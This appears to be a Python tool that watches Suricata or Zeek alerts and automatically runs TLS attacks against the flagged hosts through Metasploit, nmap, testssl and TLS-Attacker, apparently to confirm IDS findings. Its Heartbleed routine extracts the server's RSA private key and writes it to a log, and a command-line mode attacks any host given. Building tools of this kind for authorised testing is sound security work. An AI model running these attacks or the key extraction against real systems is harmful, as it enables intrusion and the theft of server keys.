import json
import re
import time
from datetime import datetime
import threading
import sys
import watchdog.events
import watchdog.observers
import subprocess
import os
from ciphers import cbc_ciphers, rsa_ciphers, export_ciphers, des_ciphers
from certificate import (
    get_cert_for_hostname,
    get_cert_status_for_host,
    get_certificate_fingerprint,
)
from single_attack import single_attack

connessioni_attive = {}
server_tested = []
vuln_conn = {}
tls_version_conn = {}
cv = threading.Condition()
MAX_NUM = 50
full_version = 0
IDS = 'Suricata'
ciphers_config = []
versions_config = []
certificate_fingerprint_config = []
config_input = False

COLOR = {
    "HEADER": "\033[95m",
    "BLUE": "\033[94m",
    "GREEN": "\033[92m",
    "RED": "\033[91m",
    "YELLOW": "\033[93m",
    "CIANO": "\033[36m",
    "ENDC": "\033[0m",
}


def escape_ansi(line):
    ansi_escape = re.compile(r'(\x9B|\x1B\[)[0-?]*[ -\/]*[@-~]')
    return ansi_escape.sub('', line)


def log_print(action):
    current_time = datetime.now().strftime("%H:%M:%S")
    print(f'{current_time} --- {action}')


def log_print_attack(ip_source, port_source, attack):
    current_time = datetime.now().strftime("%H:%M:%S")
    print(
        f"{current_time} --- {COLOR['YELLOW']}Start test for {ip_source}:{port_source} for {attack} vulnerability{COLOR['ENDC']}"
    )


def pulizia_output(string):
    if "Further" in string:
        s = string.split("Further", 1)[1]
    elif "<<--" in string:
        parts = string.split("<<--", 1)
        s = parts[1] if len(parts) > 1 else parts[0]
    else:
        s = string
    s2 = s.split("Done", 1)[0]
    return s2


def write_file(ip, port, stdout, attacco):
    current_time = datetime.now().strftime("%H:%M:%S")
    if attacco in {'CRIME', 'ROBOT', 'LOGJAM', 'SWEET32', 'LUCKY13'}:
        stdout = pulizia_output(stdout)
    elif attacco == 'BLEICHENBACHERS':
        stdout = escape_ansi(stdout)
    header = f'---------START {attacco}---------\nWrite at: {current_time}\n\n'
    footer = f'\n---------END {attacco}---------\n\n'
    src_path = f"./Logs/{ip}_{port}"
    os.makedirs(src_path, exist_ok=True)
    try:
        with open(f'{src_path}/{attacco}.log', 'a') as fp:
            fp.write(header)
            fp.write(stdout)
            fp.write(footer)
        print(f"{current_time} --- {COLOR['BLUE']}Esito {attacco} su {ip}:{port} scritto su file{COLOR['ENDC']}")
    except (SystemExit, KeyboardInterrupt):
        print("END writing file")


def metasploit_process(ip, port, tls_version):
    command = (
        f"use auxiliary/scanner/ssl/openssl_heartbleed;"
        f"set RHOST {ip};"
        f"set RPORT {port};"
        f"set TLS_VERSION {tls_version};"
        "check;exit"
    )
    try:
        metasploit = subprocess.Popen(['msfconsole', '-x', command], stdout=subprocess.PIPE)
        stout = metasploit.communicate()[0].decode().rpartition("-")
        if stout[2].strip().startswith('The target appears to be vulnerable.'):
            command_key = (
                f"use auxiliary/scanner/ssl/openssl_heartbleed;"
                f"set RHOST {ip};"
                f"set RPORT {port};"
                f"set TLS_VERSION {tls_version};"
                "keys;exit"
            )
            metasploit_key = subprocess.Popen(['msfconsole', '-x', command_key], stdout=subprocess.PIPE)
            keyout = metasploit_key.communicate()[0].decode()
            private_key = keyout.rpartition('-----BEGIN RSA PRIVATE KEY-----')
            if private_key[2]:
                private_key_content = private_key[2].partition('-----END RSA PRIVATE KEY-----')[0]
                private_key_full = f'-----BEGIN RSA PRIVATE KEY-----{private_key_content}-----END RSA PRIVATE KEY-----'
                write_file(ip, port, keyout, 'PRIVATE KEY RETRIEVED BY METASPLOIT')
                log_print(
                    f'The {ip}:{port} is vulnerable to Heartbleed. The private key is stolen and it is in the log file'
                )
        write_file(ip, port, stout[2].strip(), 'HEARTBLEED BY METASPLOIT')
    except (SystemExit, KeyboardInterrupt):
        print("Interrupt Metasploit Process for KeyInterrupt")


def nmap_process(ip, port):
    heartbleed_script = "--script=ssl-heartbleed.nse"
    show_all = "--script-args=vulns.showall"
    try:
        nmap = subprocess.Popen(
            ['timeout', '120', 'nmap', '-A', '-p', port, heartbleed_script, show_all, ip],
            stdout=subprocess.PIPE,
        )
        stdout = nmap.communicate()[0].decode()
        index = stdout.partition("|")
        output = index[2].split("|")
        s_finale = output[1] + " " + output[2] if output[0] else "Timeout for heartbleed attack in NMAP Process"
        write_file(ip, port, s_finale, 'HEARTBLEED BY NMAP')
    except (SystemExit, KeyboardInterrupt):
        print("Interrupt NMAP Process Heartbleed for KeyInterrupt")


def testssl_heartbleed_process(ip, port):
    host = f"{ip}:{port}"
    try:
        attack = subprocess.Popen(
            ['testssl', '--heartbleed', '--color', '0', '--parallel', '--ssl-native', '--fast', '--warnings', 'off',
             host],
            stdout=subprocess.PIPE,
        )
        stdout = attack.communicate()[0].decode()
        write_file(ip, port, stdout, 'HEARTBLEED BY TESTSSL')
    except (SystemExit, KeyboardInterrupt):
        print("Interrupt DROWN Process for KeyInterrupt")


def heartbleed_tls_attacker(ip, port):
    path = "/home/kali/Desktop/TLS_Attack_Tools/TLS-Attacker/apps/Attacks.jar"
    host = f"{ip}:{port}"
    try:
        attack = subprocess.Popen(
            ['timeout', '80', 'java', '-jar', path, 'heartbleed', '-connect', host],
            stdout=subprocess.PIPE,
        )
        stdout = attack.communicate()[0].decode()
        vulnerable = stdout.partition("Vulnerable:")
        o2 = f"{vulnerable[1]} {vulnerable[2]}" if vulnerable[1] else 'UNDEFINED'
        write_file(ip, port, o2, 'HEARTBLEED TLS-ATTACKER')
    except (SystemExit, KeyboardInterrupt):
        print("Interrupt TLS ATTACKER Padding Oracle Attack process for KeyInterrupt")


def crime_process(ip, port):
    host = f"{ip}:{port}"
    try:
        attack = subprocess.Popen(
            ['testssl', '--crime', '--color', '0', '--parallel', '--ssl-native', '--fast', '--warnings', 'off', host],
            stdout=subprocess.PIPE,
        )
        stdout = attack.communicate()[0].decode()
        write_file(ip, port, stdout, 'CRIME')
    except (SystemExit, KeyboardInterrupt):
        print("Interrupt CRIME Process for KeyInterrupt")


def drown_attack(ip, port):
    host = f"{ip}:{port}"
    try:
        attack = subprocess.Popen(
            ['testssl', '--drown', '--color', '0', '--parallel', '--ssl-native', '--fast', '--warnings', 'off', host],
            stdout=subprocess.PIPE,
        )
        stdout = attack.communicate()[0].decode()
        write_file(ip, port, stdout, 'DROWN BY TESTSSL')
    except (SystemExit, KeyboardInterrupt):
        print("Interrupt DROWN Process for KeyInterrupt")


def drown_tls_attacker(ip, port):
    path = "/home/kali/Desktop/TLS_Attack_Tools/TLS-Attacker/apps/Attacks.jar"
    host = f"{ip}:{port}"
    try:
        attack = subprocess.Popen(
            ['timeout', '80', 'java', '-jar', path, 'generalDrown', '-connect', host],
            stdout=subprocess.PIPE,
        )
        stdout = attack.communicate()[0].decode()
        vulnerable = stdout.partition("Vulnerable:")
        o2 = f"{vulnerable[1]} {vulnerable[2]}" if vulnerable[1] else 'UNDEFINED'
        write_file(ip, port, o2, 'DROWN TLS-ATTACKER')
    except (SystemExit, KeyboardInterrupt):
        print("Interrupt TLS ATTACKER Padding Oracle Attack process for KeyInterrupt")


def bleichenbachers_process(ip, port):
    path = "/home/kali/Desktop/TLS_Attack_Tools/TLS-Attacker/apps/Attacks.jar"
    host = f"{ip}:{port}"
    try:
        attack = subprocess.Popen(
            ['timeout', '80', 'java', '-jar', path, 'bleichenbacher', '-connect', host],
            stdout=subprocess.PIPE,
        )
        stdout = attack.communicate()[0].decode()
        write_file(ip, port, stdout, 'BLEICHENBACHERS')
    except (SystemExit, KeyboardInterrupt):
        print("Interrupt Bleinchebachers Process for KeyInterrupt")


def robot_process(ip, port):
    host = f"{ip}:{port}"
    try:
        attack = subprocess.Popen(
            ['testssl', '--robot', '--color', '0', '--parallel', '--ssl-native', '--fast', '--warnings', 'off', host],
            stdout=subprocess.PIPE,
        )
        stdout = attack.communicate()[0].decode()
        write_file(ip, port, stdout, 'ROBOT')
    except (SystemExit, KeyboardInterrupt):
        print("Interrupt ROBOT Process for KeyInterrupt")


def robot_metasploit(ip, port):
    command = f"use auxiliary/scanner/ssl/bleichenbacher_oracle;set RHOST {ip};set rport {port};exploit;exit"
    try:
        metasploit = subprocess.Popen(['msfconsole', '-x', command], stdout=subprocess.PIPE)
        stout = metasploit.communicate()[0].decode().rpartition('Starting persistent handler(s)...')
        write_file(ip, port, stout[2], 'BLEICHENBACHERS BY METASPLOIT')
    except (SystemExit, KeyboardInterrupt):
        print("Interrupt Metasploit Process for KeyInterrupt")


def padding_attack_process_tls_attacker(ip, port):
    path = "/home/kali/Desktop/TLS_Attack_Tools/TLS-Attacker/apps/Attacks.jar"
    host = f"{ip}:{port}"
    try:
        attack = subprocess.Popen(
            ['timeout', '80', 'java', '-jar', path, 'padding_oracle', '-connect', host],
            stdout=subprocess.PIPE,
        )
        stdout = attack.communicate()[0].decode()
        vulnerable = stdout.partition("Vulnerable:")
        o2 = f"{vulnerable[1]} {vulnerable[2]}" if vulnerable[1] else 'UNDEFINED'
        write_file(ip, port, o2, 'Padding Oracle Attack')
    except (SystemExit, KeyboardInterrupt):
        print("Interrupt TLS ATTACKER Padding Oracle Attack process for KeyInterrupt")


def sweet32_process(ip, port):
    host = f"{ip}:{port}"
    try:
        attack = subprocess.Popen(
            ['testssl', '--sweet32', '--color', '0', '--parallel', '--ssl-native', '--fast', '--warnings', 'off', host],
            stdout=subprocess.PIPE,
        )
        stdout = attack.communicate()[0].decode()
        write_file(ip, port, stdout, 'SWEET32')
    except (SystemExit, KeyboardInterrupt):
        print("Interrupt Sweet32 Process for KeyInterrupt")


def logjam_process(ip, port):
    host = f"{ip}:{port}"
    try:
        attack = subprocess.Popen(
            ['testssl', '--logjam', '--color', '0', '--parallel', '--ssl-native', '--fast', '--warnings', 'off', host],
            stdout=subprocess.PIPE,
        )
        stdout = attack.communicate()[0].decode()
        write_file(ip, port, stdout, 'LOGJAM')
    except (SystemExit, KeyboardInterrupt):
        print("Interrupt LOGJAM Process for KeyInterrupt")


def logjam_process_nmap(ip, port):
    logjam_script = "--script=ssl-dh-params.nse"
    show_all = "--script-args=vulns.showall"
    try:
        logjam = subprocess.Popen(['nmap', '-A', '-p', port, logjam_script, show_all, ip], stdout=subprocess.PIPE)
        stdout = logjam.communicate()[0].decode()
        index = stdout.partition("|")
        output = index[2].split("|")
        if len(output) > 1:
            o2 = output[1] + " " + output[2]
        else:
            o2 = stdout.partition("NSE: ")[2].split("Nmap")[0]
        write_file(ip, port, o2, 'LOGJAM BY NMAP')
    except (SystemExit, KeyboardInterrupt):
        print("Interrupt NMAP LOGJAM Process for KeyInterrupt")


def lucky13_process(ip, port):
    host = f"{ip}:{port}"
    try:
        attack = subprocess.Popen(
            ['testssl', '--lucky13', '--color', '0', '--parallel', '--ssl-native', '--fast', '--warnings', 'off', host],
            stdout=subprocess.PIPE,
        )
        stdout = attack.communicate()[0].decode()
        write_file(ip, port, stdout, 'LUCKY13')
    except (SystemExit, KeyboardInterrupt):
        print("Interrupt Lucky13 Process for KeyInterrupt")


def poodle_nmap_process(ip, port):
    poodle_script = "--script=ssl-poodle"
    show_all = "--script-args=vulns.showall"
    try:
        poodle = subprocess.Popen(['nmap', '-A', '-p', port, poodle_script, show_all, ip], stdout=subprocess.PIPE)
        stdout = poodle.communicate()[0].decode()
        index = stdout.partition("|")
        output = index[2].split("|")
        o2 = output[1] + " " + output[2]
        write_file(ip, port, o2, 'POODLE BY NMAP')
    except (SystemExit, KeyboardInterrupt):
        print("Interrupt NMAP POODLE Process for KeyInterrupt")


def poodle_testssl(ip, port):
    host = f"{ip}:{port}"
    try:
        attack = subprocess.Popen(
            ['testssl', '--poodle', '--color', '0', '--parallel', '--ssl-native', '--fast', '--warnings', 'off', host],
            stdout=subprocess.PIPE,
        )
        stdout = attack.communicate()[0].decode()
        write_file(ip, port, stdout, 'POODLE TESTSSL')
    except (SystemExit, KeyboardInterrupt):
        print("Interrupt Poodle Process for KeyInterrupt")


def poodle_tls_attacker(ip, port):
    path = "/home/kali/Desktop/TLS_Attack_Tools/TLS-Attacker/apps/Attacks.jar"
    host = f"{ip}:{port}"
    try:
        attack = subprocess.Popen(
            ['timeout', '80', 'java', '-jar', path, 'poodle', '-connect', host],
            stdout=subprocess.PIPE,
        )
        stdout = attack.communicate()[0].decode()
        vulnerable = stdout.partition("Vulnerable:")
        o2 = f"{vulnerable[1]} {vulnerable[2]}" if vulnerable[1] else 'UNDEFINED'
        write_file(ip, port, o2, 'POODLE TLS-ATTACKER')
    except (SystemExit, KeyboardInterrupt):
        print("Interrupt TLS ATTACKER Poodle Attack process for KeyInterrupt")


def ticketbleed_process(ip, port):
    ticketbleed_script = "--script=tls-ticketbleed"
    show_all = "--script-args=vulns.showall"
    try:
        ticketbleed = subprocess.Popen(
            ['nmap', '-A', '-p', port, ticketbleed_script, show_all, ip], stdout=subprocess.PIPE
        )
        stdout = ticketbleed.communicate()[0].decode()
        index = stdout.partition("|")
        output = index[2].split("|")
        if len(output) > 1:
            o2 = output[1] + " " + output[2]
        else:
            o2 = stdout.partition("NSE: ")[2].split("Nmap")[0]
        write_file(ip, port, o2, 'TICKETBLEED BY NMAP')
    except (SystemExit, KeyboardInterrupt):
        print("Interrupt NMAP TICKETBLEED Process for KeyInterrupt")


def ccs_injection_process_nmap(ip, port):
    ccs_injection_script = "--script=ssl-ccs-injection"
    show_all = "--script-args=vulns.showall"
    try:
        ccs_injection = subprocess.Popen(
            ['nmap', '-A', '-p', port, ccs_injection_script, show_all, ip],
            stdout=subprocess.PIPE,
        )
        stdout = ccs_injection.communicate()[0].decode()
        index = stdout.partition("|")
        output = index[2].split("ssl-ccs-injection:")
        if len(output) > 1:
            o = output[1].split('|_')
            if len(o) <= 1:
                write_file(ip, port, stdout, 'CCS Injection BY NMAP')
            else:
                o2 = 'ssl-ccs-injection:' + o[0] + o[1]
                write_file(ip, port, o2, 'CCS Injection BY NMAP')
        else:
            write_file(ip, port, stdout, 'CCS Injection BY NMAP')
    except (SystemExit, KeyboardInterrupt):
        print("Interrupt NMAP CCS Injection Process for KeyInterrupt")
    except IndexError:
        write_file(ip, port, f"Server responds in unexpected way:\n RESPONSE:{stdout}", 'CCS Injection BY NMAP')


def ccs_injection_process_metasploit(ip, port):
    command = f"use auxiliary/scanner/ssl/openssl_ccs;set RHOST {ip};set RPORT {port};exploit;exit"
    try:
        metasploit = subprocess.Popen(['msfconsole', '-x', command], stdout=subprocess.PIPE)
        stout = metasploit.communicate()[0].decode().rpartition('Starting persistent handler(s)...')
        write_file(ip, port, stout[2], 'CCS Injection BY METASPLOIT')
    except (SystemExit, KeyboardInterrupt):
        print("Interrupt Metasploit Process for KeyInterrupt")


def roca_process(ip, port):
    roca_script = "--script=rsa-vuln-roca"
    show_all = "--script-args=vulns.showall"
    try:
        roca = subprocess.Popen(['nmap', '-A', '-p', port, roca_script, show_all, ip], stdout=subprocess.PIPE)
        stdout = roca.communicate()[0].decode()
        index = stdout.partition("|")
        output = index[2].split("rsa-vuln-roca:")
        if len(output) > 1:
            o = output[1].split('|_')
            if len(o) <= 1:
                write_file(ip, port, stdout, 'ROCA Vulnerability')
            else:
                o2 = 'ssl-ccs-injection:' + o[0] + o[1]
                write_file(ip, port, o2, 'ROCA Vulnerability')
        else:
            write_file(ip, port, stdout, 'ROCA Vulnerability')
    except (SystemExit, KeyboardInterrupt):
        print("Interrupt NMAP ROCA Process for KeyInterrupt")
    except IndexError:
        write_file(ip, port, f"Server responds in unexpected way:\n RESPONSE:{stdout}", 'ROCA Vulnerability')


def testssl_lab(ip, port):
    nomefile = f"./Logs/testssl_{ip}:{port}.log"
    addr = f"{ip}:{port}"
    try:
        testssl = subprocess.Popen(
            [
                'testssl',
                '-U',
                '--full',
                '--severity',
                'LOW',
                '--json',
                '--parallel',
                '-n',
                'none',
                '--logfile',
                nomefile,
                addr,
            ],
            stdout=subprocess.PIPE,
        )
        testssl.wait()
        with open(f"color_{nomefile}.html", 'w') as color:
            subprocess.run(['aha', '-f', nomefile], stdout=color)
        log_print(f'Testssl in full mode has produced the results for {ip}:{port} in file {nomefile}')
    except (SystemExit, KeyboardInterrupt):
        print("END TestSSL Process for KeyInterrupt")


class Handler(watchdog.events.PatternMatchingEventHandler):
    def __init__(self):
        super().__init__(ignore_directories=True, case_sensitive=False)
        logfile_path = r"/var/log/suricata/mio_fast.log" if IDS == "Suricata" else r"/opt/zeek/logs/current/ssl.log"
        self.logfile = open(logfile_path, "rb")

    def on_created(self, event):
        log_print(f'The log file is created. Now we can start!')

    def on_modified(self, event):
        if IDS == "Suricata":
            f = threading.Thread(target=file_reader_suricata, args=(self.logfile,), daemon=True)
        else:
            f = threading.Thread(target=file_reader_zeek, args=(self.logfile,), daemon=True)
        try:
            f.start()
        except (KeyboardInterrupt, SystemExit):
            print("---STOP - Keyboard Interrupt")
            sys.exit(2)


def verifica_vulnerabilita():
    log_print("Vulnerability test thread is started...")
    global vuln_conn
    global connessioni_attive
    job = []
    try:
        while True:
            cv.acquire()
            while len(vuln_conn.keys()) < 1:
                log_print("Empty Queue. It's time to sleep...")
                cv.wait()
                log_print(f"Someone knocks. WAKE UP!")
            connessioni, all_vuln_for_conn = vuln_conn.popitem()
            cv.notify()
            cv.release()
            log_print(f"{COLOR['CIANO']}Found new connection: {connessioni}{COLOR['ENDC']}")
            source = connessioni.split("->")[0]
            dest = connessioni.split("->")[1]
            if IDS == 'Suricata':
                ip_source = source.split(":")[0].split(" ")[1]
            else:
                ip_source = source.split(":")[0]
            ip_dest = dest.split(":")[0]
            port_source = source.split(":")[1].split(" ")[0]
            port_dest = dest.split(":")[1]
            for test_vuln in all_vuln_for_conn:
                if test_vuln == "HEARTBEAT EXTENSION":
                    tls_version = tls_version_conn.pop(connessioni)
                    heartbleed_metasploit = threading.Thread(
                        target=metasploit_process, args=(ip_source, port_source, tls_version)
                    )
                    heartbleed_metasploit.start()
                    log_print_attack(ip_source, port_source, 'HEARTBLEED WITH METASPLOIT')
                    job.append(heartbleed_metasploit)
                    heartbleed_nmap = threading.Thread(target=nmap_process, args=(ip_source, port_source))
                    heartbleed_nmap.start()
                    log_print_attack(ip_source, port_source, 'HEARTBLEED WITH NMAP')
                    job.append(heartbleed_nmap)
                    heartbleed_testssl = threading.Thread(
                        target=testssl_heartbleed_process, args=(ip_source, port_source)
                    )
                    heartbleed_testssl.start()
                    log_print_attack(ip_source, port_source, 'HEARTBLEED WITH TESTSSL')
                    job.append(heartbleed_testssl)
                    heartbleed_tls_attacker_thread = threading.Thread(
                        target=heartbleed_tls_attacker, args=(ip_source, port_source)
                    )
                    heartbleed_tls_attacker_thread.start()
                    log_print_attack(ip_source, port_source, 'HEARTBLEED WITH TLS-ATTACKER')
                    job.append(heartbleed_tls_attacker_thread)
                if test_vuln == "CRIME":
                    crime = threading.Thread(target=crime_process, args=(ip_source, port_source))
                    crime.start()
                    log_print_attack(ip_source, port_source, 'CRIME')
                    job.append(crime)
                if test_vuln == "PADDING ORACLE ATTACK":
                    padding_oracle = threading.Thread(
                        target=padding_attack_process_tls_attacker, args=(ip_source, port_source)
                    )
                    padding_oracle.start()
                    log_print_attack(ip_source, ip_dest, 'PADDING ORACLE ATTACK')
                    job.append(padding_oracle)
                    poodle = threading.Thread(target=poodle_nmap_process, args=(ip_source, port_source))
                    poodle.start()
                    log_print_attack(ip_source, ip_dest, 'POODLE WITH NMAP')
                    job.append(poodle)
                    poodle_testssl_thread = threading.Thread(target=poodle_testssl, args=(ip_source, port_source))
                    poodle_testssl_thread.start()
                    log_print_attack(ip_source, ip_dest, 'POODLE WITH TESTSSL')
                    job.append(poodle_testssl_thread)
                    poodle_tls_attacker_thread = threading.Thread(
                        target=poodle_tls_attacker, args=(ip_source, port_source)
                    )
                    poodle_tls_attacker_thread.start()
                    log_print_attack(ip_source, ip_dest, 'POODLE WITH TLS-ATTACKER')
                    job.append(poodle_tls_attacker_thread)
                if test_vuln == 'LUCKY13':
                    lucky13 = threading.Thread(target=lucky13_process, args=(ip_source, port_source))
                    lucky13.start()
                    log_print_attack(ip_source, port_source, 'LUCKY13 ATTACK')
                    job.append(lucky13)
                if test_vuln == 'DROWN':
                    log_print(
                        f'{COLOR["RED"]}Warning! SSLv2 found on network for connection: {ip_source}:{port_source}{COLOR["ENDC"]}'
                    )
                    drown = threading.Thread(target=drown_attack, args=(ip_source, port_source))
                    drown.start()
                    log_print_attack(ip_source, port_source, 'DROWN ATTACK WITH TESTSSL')
                    job.append(drown)
                    drown_tls_attacker_thread = threading.Thread(
                        target=drown_tls_attacker, args=(ip_source, port_source)
                    )
                    drown_tls_attacker_thread.start()
                    log_print_attack(ip_source, port_source, 'DROWN ATTACK WITH TLS-ATTACKER')
                    job.append(drown_tls_attacker_thread)
                if test_vuln == 'SWEET32':
                    sweet32 = threading.Thread(target=sweet32_process, args=(ip_source, port_source))
                    sweet32.start()
                    log_print_attack(ip_source, port_source, 'SWEET32 ATTACK')
                    job.append(sweet32)
                if test_vuln == 'LOGJAM':
                    logjam = threading.Thread(target=logjam_process, args=(ip_source, port_source))
                    logjam.start()
                    log_print_attack(ip_source, port_source, 'LOGJAM ATTACK WITH TESTSSL')
                    job.append(logjam)
                    logjam_nmap_thread = threading.Thread(target=logjam_process_nmap, args=(ip_source, port_source))
                    logjam_nmap_thread.start()
                    log_print_attack(ip_source, port_source, 'LOGJAM ATTACK WITH NMAP')
                    job.append(logjam_nmap_thread)
                if test_vuln == "BLEICHENBACHER":
                    bleichenbachers = threading.Thread(
                        target=bleichenbachers_process, args=(ip_source, port_source)
                    )
                    bleichenbachers.start()
                    log_print_attack(ip_source, ip_dest, 'BLEICHENBACHER')
                    job.append(bleichenbachers)
                    robot = threading.Thread(target=robot_process, args=(ip_source, port_source))
                    robot.start()
                    log_print_attack(ip_source, ip_dest, 'ROBOT')
                    job.append(robot)
                    bleichenbachers_metasploit_thread = threading.Thread(
                        target=robot_metasploit, args=(ip_source, port_source)
                    )
                    bleichenbachers_metasploit_thread.start()
                    log_print_attack(ip_source, port_source, 'BLEICHENBACHERS ATTACK WITH METASPLOIT')
                    job.append(bleichenbachers_metasploit_thread)
                    roca = threading.Thread(target=roca_process, args=(ip_source, port_source))
                    roca.start()
                    log_print_attack(ip_source, ip_dest, 'ROCA')
                    job.append(roca)
                if test_vuln == "TICKETBLEED":
                    ticketbleed = threading.Thread(target=ticketbleed_process, args=(ip_source, port_source))
                    ticketbleed.start()
                    log_print_attack(ip_source, ip_dest, 'TICKETBLEED')
                    job.append(ticketbleed)
                if test_vuln == "CCSINJECTION":
                    ccsinjection_nmap = threading.Thread(
                        target=ccs_injection_process_nmap, args=(ip_source, port_source)
                    )
                    ccsinjection_nmap.start()
                    log_print_attack(ip_source, ip_dest, 'CCS INJECTION BY NMAP')
                    job.append(ccsinjection_nmap)
                    ccs_injection_metasploit = threading.Thread(
                        target=ccs_injection_process_metasploit, args=(ip_source, port_source)
                    )
                    ccs_injection_metasploit.start()
                    log_print_attack(ip_source, ip_dest, 'CCS INJECTION BY METASPLOIT')
                    job.append(ccs_injection_metasploit)
                if test_vuln == 'CERTIFICATE':
                    cert, cert_string = get_cert_for_hostname(ip_source, port_source)
                    certificate_monitored_fingerprint = get_certificate_fingerprint(cert, ip_source, port_source)
                    if certificate_monitored_fingerprint not in certificate_fingerprint_config:
                        test_certificate = threading.Thread(
                            target=get_cert_status_for_host,
                            args=(ip_source, port_source, cert, cert_string),
                            daemon=True,
                        )
                        test_certificate.start()
                        log_print(f'Start test for certificate in connection {connessioni}')
                        job.append(test_certificate)
            while job:
                test = job.pop()
                if test.is_alive():
                    test.join()
    except (KeyboardInterrupt, SystemExit):
        cv.notify()
        cv.release()
        for test in job:
            print("----STOP -> KEYBOARD INTERRUPT-----")
            test.join()
        print("END of verifica")
        sys.exit(3)


def file_reader_suricata(fp):
    global vuln_conn
    for line in fp:
        cipher_suite_found = ''
        tls_version_found = ''
        source_dest = line.decode().partition("{TCP}")[2].strip()
        vuln = line.decode().partition("|VULNERABILITY|")
        tls_version = vuln[0].split("+")
        if len(tls_version) > 1:
            tls_version_found = tls_version[1]
        if vuln[1]:
            cv.acquire()
            cipher_suite = vuln[2].split("%")
            if len(cipher_suite) > 1:
                cipher_suite_found = cipher_suite[1]
            vulnerabilities = vuln[2].split("#")
            new_vulnerability = vulnerabilities[1]
            flag = False
            if new_vulnerability in {
                'CERTIFICATE',
                'SELF SIGNED',
                'EXPIRED',
                'CRIME',
                'HEARTBEAT EXTENSION',
            }:
                flag = True
            if tls_version_found not in versions_config and tls_version_found:
                flag = True
            if cipher_suite_found not in ciphers_config and cipher_suite_found:
                flag = True
            if flag:
                if source_dest not in vuln_conn:
                    vuln_conn[source_dest] = []
                if new_vulnerability not in vuln_conn[source_dest]:
                    version = ""
                    if new_vulnerability == 'HEARTBEAT EXTENSION':
                        version = vuln[2].split("$")[1]
                    log_print(
                        f'Suricata has found a new vulnerability is found for {source_dest}: -> {new_vulnerability}<-'
                    )
                    vuln_conn[source_dest].append(new_vulnerability)
                    if version:
                        tls_version_conn[source_dest] = version
                if len(vuln_conn) == MAX_NUM:
                    log_print(f'The queue is full. Producer Thread waits.')
                    cv.wait()
                    log_print(f'The queue is no longer full. Producer Thread wakes up.')
                cv.notify()
            cv.release()
        if full_version == 1:
            log_print(f'Start testssl in full mode')
            source = source_dest.split("->")[0]
            ip_source = source.split(":")[0].split(" ")[1]
            port_source = source.split(":")[1].split(" ")[0]
            if ip_source not in server_tested:
                server_tested.append(ip_source)
                test = threading.Thread(target=testssl_lab, args=(ip_source, port_source))
                test.start()


def file_reader_zeek(fp):
    global vuln_conn
    for line in fp:
        line_array = line.split('\x09')
        if len(line_array) > 3 and line_array[2] not in {'uid', 'string'}:
            cv.acquire()
            if len(vuln_conn) == MAX_NUM:
                log_print(f'The queue is full. Producer Thread waits.')
                cv.wait()
                log_print(f'The queue is no longer full. Producer Thread wakes up.')
            ip_src = line_array[2]
            port_src = line_array[3]
            ip_dest = line_array[4]
            port_dest = line_array[5]
            tls_version = line_array[6]
            cipher_suite = line_array[7]
            msg = line_array[15]
            compression = line_array[16]
            validation_status = line_array[20]
            if tls_version not in versions_config or cipher_suite not in ciphers_config:
                zeek_produce(
                    ip_src,
                    ip_dest,
                    port_dest,
                    port_src,
                    msg,
                    compression,
                    validation_status,
                    cipher_suite,
                    tls_version,
                )
            cv.release()


def zeek_produce(
        ip_src, ip_dest, port_dest, port_src, msg, compression, validation_status, cipher_suite, tls_version
):
    exception_ip = '10.0.2.13'
    if ip_dest != exception_ip and ip_src != exception_ip:
        log_print(f'The log file is changed. Zeek has found something...')
        src_dest = f"{ip_dest}:{port_dest} -> {ip_src}:{port_src}"
        vuln_conn[src_dest] = []
        if tls_version != 'TLSv1.3':
            vuln_conn[src_dest].extend(['TICKETBLEED', 'CCSINJECTION'])
        if cipher_suite in export_ciphers:
            vuln_conn[src_dest].append('LOGJAM')
        if cipher_suite in des_ciphers:
            vuln_conn[src_dest].append('SWEET32')
        if cipher_suite in cbc_ciphers:
            vuln_conn[src_dest].extend(['PADDING ORACLE ATTACK', 'POODLE', 'LUCKY13'])
        if cipher_suite in rsa_ciphers:
            vuln_conn[src_dest].append('BLEICHENBACHER')
        if compression == 'COMPRESSION':
            vuln_conn[src_dest].append('CRIME')
        if tls_version == 'SSLv3':
            if 'POODLE' not in vuln_conn[src_dest]:
                vuln_conn[src_dest].append('POODLE')
        if tls_version == 'SSLv2':
            vuln_conn[src_dest].append('DROWN')
        if msg == 'HEARTBEAT':
            vuln_conn[src_dest].append('HEARTBEAT EXTENSION')
            tls_version_conn[src_dest] = {
                'SSLv3': 'SSLv3',
                'TLSv10': '1.0',
                'TLSv11': '1.1',
                'TLSv12': '1.2',
                '-': '1.0',
            }.get(tls_version, '')
        if validation_status == 'self signed certificate\n':
            vuln_conn[src_dest].append('SELF SIGNED')
        vuln_conn[src_dest].append('CERTIFICATE')
        if full_version == 1:
            if ip_src not in server_tested:
                server_tested.append(ip_src)
                test = threading.Thread(target=testssl_lab, args=(ip_src, port_src))
                test.start()
        cv.notify()


def producer():
    src_path = r"/var/log/suricata/mio_fast.log" if IDS == "Suricata" else r"/usr/local/zeek/logs/current/ssl.log"
    if not os.path.exists(src_path):
        with open(src_path, 'x'):
            pass
    event_handler = Handler()
    observer = watchdog.observers.Observer()
    observer.schedule(event_handler, path=src_path, recursive=False)
    observer.start()


def help_message():
    out = '''
                ▁ ▂ ▃ ▅ ▆ ▇ █ Monitor for TLS attacks █ ▇ ▆ ▅ ▃ ▂ ▁

usage: monitor_for_tls_attacks [-h] [--full] [--IDS=Suricata/Zeek] [--json /pathToConfigJSONFile]

Monitor your network traffic with Suricata or Zeek IDS and check if the found vulnerabilities are TP or FP. Before starting this tool you must execute Suricata/Zeek.

NOTE: If you have changed the default path of log file for the IDS you have to change it also in this tool.
Suricata log path variable: src_path = r"/var/log/suricata/fast.log"
Zeek log path variable:  src_path = r"/usr/local/zeek/logs/current/ssl.log"

optional arguments:
  -h, --help            show this help message and exit
  --full                use testssl to make a TLS configuration screenshot of the tested server
  --IDS=Suricata        use Suricata as IDS. This is the default setting
  --IDS=Zeek, --zeek    use Zeek as IDS
  --json                use a network config file in json format

It is possible to use the attacks of this tool without the IDS in the following way:

    usage: monitor_for_tls_attacks [--attack attack_name] [--host ip:port]

The attack_name can be:
    - heartbleed
    - crime
    - drown
    - bleichenbacher
    - robot
    - padding_oracle_attack
    - sweet32
    - logjam
    - lucky13
    - poodle
    - ticketbleed
    - ccs_injection
    - roca
  '''
    print(out)


if __name__ == "__main__":
    if "-h" in sys.argv or "--help" in sys.argv:
        help_message()
    else:
        if "--attack" in sys.argv:
            i = sys.argv.index("--attack")
            attack = sys.argv.pop(i + 1)
            j = sys.argv.index("--host")
            host = sys.argv.pop(j + 1)
            single_attack(attack, host)
        else:
            print('Start Monitor for TLS Attacks...')
            if "--full" in sys.argv:
